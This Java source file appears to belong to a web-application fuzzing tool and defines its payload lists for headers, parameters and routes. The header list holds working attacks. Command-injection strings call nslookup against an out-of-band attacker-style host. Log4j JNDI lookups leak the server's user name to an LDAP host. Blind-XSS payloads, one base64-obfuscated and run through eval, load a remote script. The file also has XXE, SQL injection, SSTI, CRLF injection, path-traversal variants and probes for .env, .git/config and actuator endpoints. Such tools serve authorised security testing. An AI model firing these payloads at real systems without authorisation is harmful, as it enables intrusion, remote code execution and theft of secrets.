package pzfzr.fuzzer;
import java.util.*;

/**
 * 统一的Payload常量类
 * 用于ParamFuzzer、RouteFuzzer和HeaderFuzzer共享payload定义
 * 注意：这个类保持向后兼容性，但新的功能应该使用PayloadManager
 */
public class PayloadConstants {

    /**
     * PayloadInfo类用于将payload和其别名绑定在一起
     * 注意：为了向后兼容性保留，新代码应该使用 pzfzr.fuzzer.PayloadInfo
     */
    public static class PayloadInfo {
        public final String payload;
        public final String alias;

        public PayloadInfo(String payload, String alias) {
            this.payload = payload;
            this.alias = alias;
        }
    }

    /**
     * 8K固定字符串用于随机测试
     */
    public static final String FIXED_8K_STRING = FixedStrings.FIXED_8K_STRING;
    /**
     * Header模糊测试专用的payload列表
     */
    public static final List<PayloadInfo> HEADER_PAYLOAD_INFOS = Arrays.asList(
//            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "99999"),
            new PayloadInfo("//etc/shells", "//etc/shells"),
            new PayloadInfo("$(env)", "$(env)"),
            new PayloadInfo("{fuzz}.ssrf.tejq8.zcyy.fun", "{fuzz}.ssrf.tejq8.zcyy.fun"),
            new PayloadInfo("null", "null"),
            new PayloadInfo("'`nslookup$IFS@{fuzz}.cmdi1.tejq8.zcyy.fun|sh`'$(nslookup$IFS@{fuzz}.cmdi1.tejq8.zcyy.fun|sh)", "cmdi 1"),
            new PayloadInfo("&nslookup {fuzz}.cmdi2.tejq8.zcyy.fun&'\\\"`0&nslookup {fuzz}.cmdi2.tejq8.zcyy.fun&`'", "cmdi 2"),
            new PayloadInfo("/*$(nslookup cmdi3.{fuzz}.tejq8.zcyy.fun)`nslookup cmdi3.{fuzz}.tejq8.zcyy.fun``*/-nslookup(cmdi3.{fuzz}.tejq8.zcyy.fun)-'/*$(nslookup cmdi3.{fuzz}.tejq8.zcyy.fun)`nslookup cmdi3.{fuzz}.tejq8.zcyy.fun` #*/-nslookup(cmdi3.{fuzz}.tejq8.zcyy.fun)||'\\\"||nslookup(cmdi3.{fuzz}.tejq8.zcyy.fun)||\\\"/*`*/", "cmdi 3"),
            new PayloadInfo("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [!ENTITY delay SYSTEM \"http://httpbin.org/delay/7\"]><root>&delay;</root>", "xml delay 7"),
            new PayloadInfo("1' OR /*!sleep*/(LENGTH('{fuzz}hb')); -- ", "1' OR /*!sleep*/"),
            new PayloadInfo("1' OR 1/0; -- ", "1' OR 1/0; -- "),
            new PayloadInfo("${j${main:\\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-{fuzz}.l4j.tejq8.zcyy.fun/}", "log4j-v"),
            new PayloadInfo("${jdni:ldap://x.{fuzz}.l4j.tejq8.zcyy.fun/a}", "log4j-v2"),
            new PayloadInfo("chaxx123'\">*/*/=end'''\"\"\"[${$(`;\\abcc8d: g00f%0d%0ac9w: g00s%c4%8d%c4%8av5m: f00Java", "chaxx + crlf"),
            new PayloadInfo(");?/%ff'\"><img/src=http://ig{fuzz}.tejq8.zcyy.fun>", ");?/%ff'\"><img>"),
            new PayloadInfo("<link rel=\"stylesheet\" href=\"https://{fuzz}.lnk.tejq8.zcyy.fun/link.css\">", "<link>"),
            new PayloadInfo("\"><script src=\"https://js.rip/nm\"></script>", "bxss1"),
            new PayloadInfo("\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL25tIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw onerror=eval(atob(this.id))>", "bxss2"),
            new PayloadInfo("{{9188*8}}", "SSTI1"),
            new PayloadInfo("${9188*8}", "SSTI2"),
            new PayloadInfo("#{9188*8}", "SSTI3"),
            new PayloadInfo("[[${9188*8}]]", "SSTI4")
    );

    /**
     * 参数模糊测试专用的payload列表
     * 注意：这些是默认值，实际使用时应该通过PayloadManager获取启用的payloads
     */
    public static final List<PayloadInfo> PARAM_PAYLOAD_INFOS = Arrays.asList(
            new PayloadInfo("chaxx123", "chaxx"),
            new PayloadInfo("0", "\"0\""),
            new PayloadInfo("-1", "\"-1\""),
            new PayloadInfo("0", "0"),
            new PayloadInfo("-1", "-1"),
            new PayloadInfo("999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999", "99999"),
            new PayloadInfo("%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00", "%00%00%00"),
            new PayloadInfo("true", "true"),
            new PayloadInfo("false", "false"),
            new PayloadInfo("true", "\"true\""),
            new PayloadInfo("false", "\"false\""),
            new PayloadInfo("null", "null"),
            new PayloadInfo("null", "\"null\""),
            new PayloadInfo("\\r\\n", "\\r\\n"),
            new PayloadInfo("", "empty"),
            new PayloadInfo("%", "%"),
            new PayloadInfo("%00", "%00"),
            new PayloadInfo("*", "*"),
            new PayloadInfo("+", "+"),
            new PayloadInfo(";", ";"),
            // 字符串形式（适用于GET、POST、JSON字符串）
            new PayloadInfo("%3f", "?(%3f)"),
            new PayloadInfo("#", "#"),
            new PayloadInfo("?", "?"),
            new PayloadInfo("{param}#", "{param}#"),
            new PayloadInfo("{param}&chaxx=xx", "{param}&norandom=xx"),
            new PayloadInfo("{param_url_encoded}", "{url_encoded}"),
//            new PayloadInfo("chaxx123'\">", "chaxx123'\">"),
            new PayloadInfo("/{param}", "/{param}"),
            new PayloadInfo("%2f{param}", "%2f{param}"),
            new PayloadInfo("./{param}", "./{param}"),
            new PayloadInfo("%2e%2f{param}", "%2e%2f{param}"),
            new PayloadInfo("{param}/../{param}", "{param}/../{param}"),
            new PayloadInfo("{param}%2f..%2f{param}", "{par}%2f..%2f{param}"),
            new PayloadInfo("{param}/", "{param}/"),
            new PayloadInfo("{param}%2f", "{param}%2f"),
            new PayloadInfo("{param}%5c..%5c..%5c", "{param}%5c..X2"),
            new PayloadInfo("{param}?", "{param}?"),
            new PayloadInfo("{param}%3f", "{param}%3f"),
            new PayloadInfo("{param}%23", "{param}%23"),
            new PayloadInfo("{param}%26chaxx=chax", "{param}%26x=x"),
            new PayloadInfo("{random_8000}", "{random_8000}"),
            new PayloadInfo("{param}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%206", "{param}CRLF"),
            new PayloadInfo("{param_double_url_encoded}", "{double_url_encoded}"),
//            new PayloadInfo("{path_double_url_encoded}", "{double_url_encoded}"),
            new PayloadInfo("{param}%2f..", "{param}%2f.."),
            new PayloadInfo("{param}/..", "{param}/.."),
            new PayloadInfo("{param}%252f..", "{param}%252f.."),
            new PayloadInfo("{param}/%2E%2E", "{param}/%2E%2E"),
            new PayloadInfo("{param}%2F%2E%2E", "{param}%2F%2E%2E"),
            new PayloadInfo("{param}//..", "{param}//.."),
            new PayloadInfo("{param}%2f%2f..", "{param}%2f%2f.."),
            new PayloadInfo("{param}/..;", "{param}/..;"),
            new PayloadInfo("{param}%5c..", "{param}%5c.."),
            new PayloadInfo("{param}\\..", "{param}\\.."),
            new PayloadInfo("{param}\\..\\..\\..\\..\\..\\..\\..\\..", "{param}\\..X8"),
            new PayloadInfo("{param}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..", "{param}%5c..X8"),
            new PayloadInfo("{param}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{param}%2f..X8"),
            new PayloadInfo("{param}/../../../../../../../..", "{param}/..X8"),
            new PayloadInfo("{param}%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..", "{param}%252f..X8"),
            new PayloadInfo("{param}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E", "{param}/%2E%2EX8"),
            new PayloadInfo("{param}%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "{param}%2F%2E%2EX8"),
            new PayloadInfo("{param}//..//..//..//..//..//..//..//..", "{param}//..X8"),
            new PayloadInfo("{param}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{param}%2f%2f..X8"),
            new PayloadInfo("{param}/..;/..;/..;/..;/..;/..;/..;/..;", "{param}/..;X8")
    );

    /**
     * 路由模糊测试专用的payload列表
     * 注意：这些是默认值，实际使用时应该通过PayloadManager获取启用的payloads
     *
     * ROUTE12类型payload（在ROUTE1和ROUTE2标签页中都显示）:
     * - "chaxx123" -> "chaxx"
     * - "{path}/chaxx" -> "{path}/chaxx"
     */
    public static final List<PayloadInfo> ROUTE_PAYLOAD_INFOS = Arrays.asList(
            new PayloadInfo("chaxx123", "chaxx"),                              // ROUTE12
            new PayloadInfo("null", "null"),                              // ROUTE12
            // 其他ROUTE类型payload
//            new PayloadInfo("chaxx123'\">", "chaxx123'\">"),
            new PayloadInfo(".", "."),
            new PayloadInfo("%23", "#"),
            new PayloadInfo("%5c", "\\"),
            new PayloadInfo("%3f", "?"),
            new PayloadInfo("{path}&chaxx=cha", "{param}&chaxx=cha"),
            new PayloadInfo("{path}%26chaxx=cha", "{param}%26chaxx=cha"),
            new PayloadInfo("{path}@{fuzz}.tejq8.zcyy.fun", "{path}@host"),
            new PayloadInfo("{path}..", "{path}.."),
            new PayloadInfo("{path1}{path2}", "{path1}{path2}"),
            new PayloadInfo("{path}%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%204", "{path}CRLF"),
            new PayloadInfo("{path}/chaxx", "{path}/chaxx"),                   // ROUTE12
            new PayloadInfo("{path}/%20H", "ng crlf"),
            new PayloadInfo("{path}/%20HTTP/19.91%0D%0Ac9w:%20x", "ng crlf2"),
            new PayloadInfo("{path}/%20HTTP/1.1%0D%0AHost:%20{fuzz}.tejq8.zcyy.fun%0D%0Ac9w:%209", "ng crlf3"),
//            new PayloadInfo("{path_del}", "{path_del}"), // 新增：删除当前路径段的payload
//            new PayloadInfo("{path}#", "{path}#"),
//            new PayloadInfo("{path}%23", "{path}%23"),
//            new PayloadInfo("{path}?", "{path}?"),
//            new PayloadInfo("{path}%3f", "{path}%3f"),
//            new PayloadInfo("{path_url_encoded}", "{url_encoded}"),
//            new PayloadInfo("/{path}", "/{path}"),
//            new PayloadInfo("%2f{path}", "%2f{path}"),
//            new PayloadInfo("./{path}", "./{path}"),
//            new PayloadInfo("%2e%2f{path}", "%2e%2f{path}"),
//            new PayloadInfo("{path}%2f..%2f{path}", "{path}%2f..%2f{path}"),
            new PayloadInfo("{path_double_url_encoded}", "{double_url_encoded}"),
            new PayloadInfo("{path}%2f..", "{path}%2f.."),
            new PayloadInfo("{path}/..", "{path}/.."),
            new PayloadInfo("{path}/%2E%2E", "{path}/%2E%2E"),
            new PayloadInfo("{path}%2F%2E%2E", "{path}%2F%2E%2E"),
            new PayloadInfo("{path}//..", "{path}//.."),
            new PayloadInfo("{path}%2f%2f..", "{path}%2f%2f.."),
            new PayloadInfo("{path}%252f..", "{path}%252f.."),
            new PayloadInfo("{path}/..;", "{path}/..;"),
            new PayloadInfo("{path}%5c..", "{path}%5c.."),
            new PayloadInfo("{path}\\..", "{path}\\.."),
            new PayloadInfo("{path}\\..\\..\\..\\..\\..\\..\\..\\..", "{path}\\..X8"),
            new PayloadInfo("{path}%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..", "{path}%5c..X8"),
            new PayloadInfo("{path}/..;/..;/..;/..;/..;/..;/..;/..;", "{path}/..;X8"),
            new PayloadInfo("{path}%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..", "{path}%252f..X8"),
            new PayloadInfo("{path}%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..", "{path}%2f..X8"),
            new PayloadInfo("{path}/../../../../../../../..", "{path}/..X8"),
            new PayloadInfo("{path}/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E", "{path}/%2E%2EX8"),
            new PayloadInfo("{path}%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "{path}%2F%2E%2EX8"),
            new PayloadInfo("{path}//..//..//..//..//..//..//..//..", "{path}//..X8"),
            new PayloadInfo("{path}%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..%2f%2f..", "{path}%2f%2f..X8"),

            // --- 新增 Spring 类路径 Payload ---
            new PayloadInfo("swagger", "swagger"),
            new PayloadInfo("swagger-resources", "swagger2"),
            new PayloadInfo("api_docs", "api_docs"),
            new PayloadInfo("v2/api-docs", "v2docs"),
            new PayloadInfo("v3/api-docs", "v3docs"),
            new PayloadInfo("actuator", "actuator"),
            new PayloadInfo("env", "env"),
            new PayloadInfo("health", "health"),
            new PayloadInfo("mappings", "mappings"),
            new PayloadInfo("gateway", "gateway"),
            new PayloadInfo("metrics", "metrics"),
            new PayloadInfo("jolokia", "jolokia"),
            new PayloadInfo(";/swagger;.js", ";/swagger;.js"),
            new PayloadInfo(";/swagger-resources;.js", ";/swagger2;.js"),
            new PayloadInfo(";/api_docs;.js", ";/api_docs;.js"),
            new PayloadInfo(";/v2/api-docs;.js", ";/v2/api-docs;.js"),
            new PayloadInfo(";/v3/api-docs;.js", ";/v3/api-docs;.js"),
            new PayloadInfo(";/actuator;.js", ";/actuator;.js"),
            new PayloadInfo(";/env;.js", ";/env;.js"),
            new PayloadInfo(";/health;.js", ";/health;.js"),
            new PayloadInfo(";/mappings;.js", ";/mappings;.js"),
            new PayloadInfo(";/gateway;.js", ";/gateway;.js"),
            new PayloadInfo(";/metrics;.js", ";/metrics;.js"),
            new PayloadInfo(";/jolokia;.js", ";/jolokia;.js"),
            new PayloadInfo(";/..;/swagger", ";/..;/swagger"),
            new PayloadInfo(";/..;/swagger-resources", ";/..;/swagger2"),
            new PayloadInfo(";/..;/api_docs", ";/..;/api_docs"),
            new PayloadInfo(";/..;/v2/api-docs", ";/..;/v2/api-docs"),
            new PayloadInfo(";/..;/v3/api-docs", ";/..;/v3/api-docs"),
            new PayloadInfo(";/..;/actuator", ";/..;/actuator"),
            new PayloadInfo(";/..;/env", ";/..;/env"),
            new PayloadInfo(";/..;/health", ";/..;/health"),
            new PayloadInfo(";/..;/mappings", ";/..;/mappings"),
            new PayloadInfo(";/..;/gateway", ";/..;/gateway"),
            new PayloadInfo(";/..;/metrics", ";/..;/metrics"),
            new PayloadInfo(";/..;/jolokia", ";/..;/jolokia"),
            new PayloadInfo(";/..;/..;/swagger", ";/..;/X2-swagger"),
            new PayloadInfo(";/..;/..;/swagger-resources", ";/..;/X2-swagger2"),
            new PayloadInfo(";/..;/..;/api_docs", ";/..;/..;/api_docs"),
            new PayloadInfo(";/..;/..;/v2/api-docs", ";/..;/..;/v2/api-docs"),
            new PayloadInfo(";/..;/..;/v3/api-docs", ";/..;/..;/v3/api-docs"),
            new PayloadInfo(";/..;/..;/actuator", ";/..;/..;/actuator"),
            new PayloadInfo(";/..;/..;/env", ";/..;/..;/env"),
            new PayloadInfo(";/..;/..;/health", ";/..;/..;/health"),
            new PayloadInfo(";/..;/..;/mappings", ";/..;/..;/mappings"),
            new PayloadInfo(";/..;/..;/gateway", ";/..;/..;/gateway"),
            new PayloadInfo(";/..;/..;/metrics", ";/..;/..;/metrics"),
            new PayloadInfo(";/..;/..;/jolokia", ";/..;/..;/jolokia"),
            new PayloadInfo(";/..;/..;/..;/swagger", ";/..;/X3-swagger"),
            new PayloadInfo(";/..;/..;/..;/swagger-resources", ";/..;/X3-swagger2"),
            new PayloadInfo(";/..;/..;/..;/api_docs", ";/..;/..;/..;/api_docs"),
            new PayloadInfo(";/..;/..;/..;/v2/api-docs", ";/..;/..;/..;/v2/api-docs"),
            new PayloadInfo(";/..;/..;/..;/v3/api-docs", ";/..;/..;/..;/v3/api-docs"),
            new PayloadInfo(";/..;/..;/..;/actuator", ";/..;/..;/..;/actuator"),
            new PayloadInfo(";/..;/..;/..;/env", ";/..;/..;/..;/env"),
            new PayloadInfo(";/..;/..;/..;/health", ";/..;/..;/..;/health"),
            new PayloadInfo(";/..;/..;/..;/mappings", ";/..;/..;/..;/mappings"),
            new PayloadInfo(";/..;/..;/..;/gateway", ";/..;/..;/..;/gateway"),
            new PayloadInfo(";/..;/..;/..;/metrics", ";/..;/..;/..;/metrics"),
            new PayloadInfo(";/..;/..;/..;/jolokia", ";/..;/..;/..;/jolokia"),

            // --- 新增 Spring 类 URL Rewrite Payload ---
            new PayloadInfo("swagger", "swagger-rewrite"),
            new PayloadInfo("swagger-resources", "swagger2-rewrite"),
            new PayloadInfo("api_docs", "api_docs-rewrite"),
            new PayloadInfo("v2/api-docs", "v2docs-rewrite"),
            new PayloadInfo("v3/api-docs", "v3docs-rewrite"),
            new PayloadInfo("actuator", "actuator-rewrite"),
            new PayloadInfo("env", "env-rewrite"),
            new PayloadInfo("health", "health-rewrite"),
            new PayloadInfo("mappings", "mappings-rewrite"),
            new PayloadInfo("gateway", "gateway-rewrite"),
            new PayloadInfo("metrics", "metrics-rewrite"),
            new PayloadInfo("jolokia", "jolokia-rewrite"),

            // --- 新增 通用框架信息泄露探测 Payload ---
            new PayloadInfo(".env", ".env"),
            new PayloadInfo(".env.local", ".env.local"),
            new PayloadInfo(".env.prod", ".env.prod"),
            new PayloadInfo("appsettings.json", "appsettings.json"),
            new PayloadInfo(".git/", ".git/"),
            new PayloadInfo(".git/config", ".git/config"),
            new PayloadInfo(".DS_Store", ".DS_Store"),
            new PayloadInfo(".svn/entries", ".svn/entries"),
            new PayloadInfo(".svn/", ".svn/"),
            new PayloadInfo("wc.db", "wc.db"),
            new PayloadInfo("manager//..;/", "manager//..;/"),
            new PayloadInfo("settings.py", "settings.py"),
            new PayloadInfo("admin_dev.php", "admin_dev.php"),
            new PayloadInfo("index_dev.php", "index_dev.php"),
            new PayloadInfo("app_dev.php", "app_dev.php"),
            new PayloadInfo("_fragment", "_fragment"),
            new PayloadInfo("_profiler", "_profiler"),

            // --- 新增 {sub../} 特殊逻辑 Payload ---
            new PayloadInfo("{sub../}.env", "{sub../}.env"),
            new PayloadInfo("{sub../}.env.local", "{sub../}.env.local"),
            new PayloadInfo("{sub../}.env.prod", "{sub../}.env.prod"),
            new PayloadInfo("{sub../}appsettings.json", "{sub../}appsettings.json"),
            new PayloadInfo("{sub../}.git/", "{sub../}.git/"),
            new PayloadInfo("{sub../}.git/config", "{sub../}.git/config"),
            new PayloadInfo("{sub../}.DS_Store", "{sub../}.DS_Store"),
            new PayloadInfo("{sub../}.svn/entries", "{sub../}.svn/entries"),
            new PayloadInfo("{sub../}.svn/", "{sub../}.svn/"),
            new PayloadInfo("{sub../}wc.db", "{sub../}wc.db"),
            new PayloadInfo("{sub../}manager//..;/", "{sub../}manager//..;/"),
            new PayloadInfo("{sub../}settings.py", "{sub../}settings.py"),
            new PayloadInfo("{sub../}admin_dev.php", "{sub../}admin_dev.php"),
            new PayloadInfo("{sub../}index_dev.php", "{sub../}index_dev.php"),
            new PayloadInfo("{sub../}app_dev.php", "{sub../}app_dev.php"),
            new PayloadInfo("{sub../}_fragment", "{sub../}_fragment"),
            new PayloadInfo("{sub../}_profiler", "{sub../}_profiler"),

            // --- 新增 通用框架信息泄露探测 URL Rewrite Payload ---
            new PayloadInfo(".env", ".env-rewrite"),
            new PayloadInfo(".env.local", ".env.local-rewrite"),
            new PayloadInfo(".env.prod", ".env.prod-rewrite"),
            new PayloadInfo("appsettings.json", "appsettings.json-rewrite"),
            new PayloadInfo(".git/", ".git/-rewrite"),
            new PayloadInfo(".git/config", ".git/config-rewrite"),
            new PayloadInfo(".DS_Store", ".DS_Store-rewrite"),
            new PayloadInfo(".svn/entries", ".svn/entries-rewrite"),
            new PayloadInfo(".svn/", ".svn/-rewrite"),
            new PayloadInfo("wc.db", "wc.db-rewrite"),
            new PayloadInfo("manager//..;/", "manager//..;/-rewrite"),
            new PayloadInfo("settings.py", "settings.py-rewrite"),
            new PayloadInfo("admin_dev.php", "admin_dev.php-rewrite"),
            new PayloadInfo("index_dev.php", "index_dev.php-rewrite"),
            new PayloadInfo("app_dev.php", "app_dev.php-rewrite"),
            new PayloadInfo("_fragment", "_fragment-rewrite"),
            new PayloadInfo("_profiler", "_profiler-rewrite")
    );

    /**
     * 通用payload处理工具类
     */
    public static class PayloadProcessor {
        private static final ThreadLocal<Random> RANDOM = ThreadLocal.withInitial(Random::new);
        private static final String HASH_CHARS = "0123456789abcdefghijklmnopqrstuvwxyz";
        private static final int HASH_LENGTH = 5;
        /**
         * 生成随机hash字符串用于{fuzz}替换
         */
        public static String generateRandomHash() {
            char[] hash = new char[HASH_LENGTH];
            for (int i = 0; i < HASH_LENGTH; i++) {
                hash[i] = HASH_CHARS.charAt(RANDOM.get().nextInt(HASH_CHARS.length()));
            }
            return new String(hash);
        }

        /**
         * 完全URL编码字符串（编码所有字符）
         */
        public static String urlEncodeFullly(String input) {
            if (input == null || input.isEmpty()) {
                return input;
            }
            StringBuilder result = new StringBuilder();
            byte[] bytes = input.getBytes(java.nio.charset.StandardCharsets.UTF_8);
            for (byte b : bytes) {
                result.append(String.format("%%%02x", b & 0xFF));
            }
            return result.toString();
        }

        /**
         * 处理payload中的通用替换
         * @param payload 原始payload
         * @param paramValue 参数值
         * @return 处理后的payload
         */
        public static String processCommonReplacements(String payload, String paramValue) {
            String processed = payload;
            // 处理 8000 字符随机字符串
            if ("{random_8000}".equals(payload)) {
                return FIXED_8K_STRING;
            }

            // 处理URL编码的特殊情况
            if ("{param_url_encoded}".equals(payload) || "{path_url_encoded}".equals(payload)) {
                processed = urlEncodeFullly(paramValue);
            } else if ("{param_double_url_encoded}".equals(payload) || "{path_double_url_encoded}".equals(payload)) {
                String singleEncoded = urlEncodeFullly(paramValue);
                processed = urlEncodeFullly(singleEncoded);
            } else {
                // 将{param}或{path}替换为实际参数值
                processed = processed.replace("{param}", paramValue);
                processed = processed.replace("{path}", paramValue);
            }

            // 处理{fuzz}替换
            if (processed.contains("{fuzz}")) {
                processed = processed.replace("{fuzz}", generateRandomHash());
            }

            return processed;
        }
    }
}